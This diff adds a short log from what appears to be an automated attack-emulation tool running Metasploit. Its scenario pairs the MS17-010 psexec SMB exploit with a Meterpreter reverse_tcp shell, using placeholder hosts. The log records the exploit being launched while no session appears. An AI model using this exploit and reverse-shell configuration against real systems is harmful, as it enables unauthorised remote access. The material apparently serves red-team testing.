@@ -1,0 +1,19 @@
+2020-06-01 20:20:57,279- session-for-5ed51ce2051e140dbc0be35d - INFO - Property Not Found
+2020-06-01 20:21:07,417- session-for-5ed51ce2051e140dbc0be35d - INFO - ....................Parsing Scenario....................
+2020-06-01 20:21:07,419- session-for-5ed51ce2051e140dbc0be35d - INFO - [{'TA01_T1190_P1': {'name': 'ms17_010_psexec', 'tactic': 'Initial_Access', 'try_count': 3, 'spawn_seperate_session': True, 'tool': 'metasploit', 'exploit': 'windows/smb/ms17_010_psexec', 'payload': 'windows/meterpreter/reverse_tcp', 'options': {'LHOST': 'LHOST_$ref', 'LPORT': 'LPORT_$ref', 'RHOSTS': 'RHOSTS_$ref'}}}]
+2020-06-01 20:21:07,420- session-for-5ed51ce2051e140dbc0be35d - INFO - *****************************Check tools status*****************************
+2020-06-01 20:21:07,420- session-for-5ed51ce2051e140dbc0be35d - INFO - ['metasploit']
+2020-06-01 20:21:07,420- session-for-5ed51ce2051e140dbc0be35d - INFO - msfconsole = [32mTrue[0m
+2020-06-01 20:21:07,420- session-for-5ed51ce2051e140dbc0be35d - INFO - ************************Updating Session Tactics**********************
+2020-06-01 20:21:07,424- session-for-5ed51ce2051e140dbc0be35d - INFO - Tacics list has been appended in list has been appended in evaluation
+2020-06-01 20:21:07,430- session-for-5ed51ce2051e140dbc0be35d - INFO - No Exceptions Found
+2020-06-01 20:21:07,519- session-for-5ed51ce2051e140dbc0be35d - INFO - post not needed
+2020-06-01 20:21:07,537- session-for-5ed51ce2051e140dbc0be35d - INFO - exploit['LHOST'] not needed...
+2020-06-01 20:21:07,537- session-for-5ed51ce2051e140dbc0be35d - INFO - exploit['LPORT'] not needed...
+2020-06-01 20:21:07,537- session-for-5ed51ce2051e140dbc0be35d - INFO - option not found in payloads
+2020-06-01 20:21:07,576- session-for-5ed51ce2051e140dbc0be35d - INFO - cid: 0
+2020-06-01 20:21:07,576- session-for-5ed51ce2051e140dbc0be35d - INFO - ....................Executing Exploit......................................
+2020-06-01 20:21:08,635- session-for-5ed51ce2051e140dbc0be35d - INFO - {'job_id': 5, 'uuid': 'ev72javl'}
+2020-06-01 20:21:08,641- session-for-5ed51ce2051e140dbc0be35d - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 20:21:11,653- session-for-5ed51ce2051e140dbc0be35d - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 20:21:14,666- session-for-5ed51ce2051e140dbc0be35d - INFO - Meterpreter Sessions list empty: {}
